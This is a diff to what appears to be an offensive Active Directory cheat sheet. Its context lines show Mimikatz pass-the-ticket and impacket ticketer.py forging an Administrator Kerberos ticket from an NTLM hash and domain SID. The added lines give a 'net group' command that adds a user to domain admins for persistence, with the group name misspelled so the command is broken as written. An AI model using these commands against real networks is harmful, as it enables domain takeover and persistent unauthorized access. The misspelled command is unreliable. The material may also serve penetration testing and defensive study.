@@ -954,6 +954,11 @@ kerberos::ptt file.kirbi
 ```
 #### Persistence
 
+Create a domain admin user
+```
+net group "domain adminis" USER /add /domain
+```
+
 Create a Administrator.ccache
 ```
 ticketer.py -nthash NTLM -domain-sid SID -domain domain.local Administrator
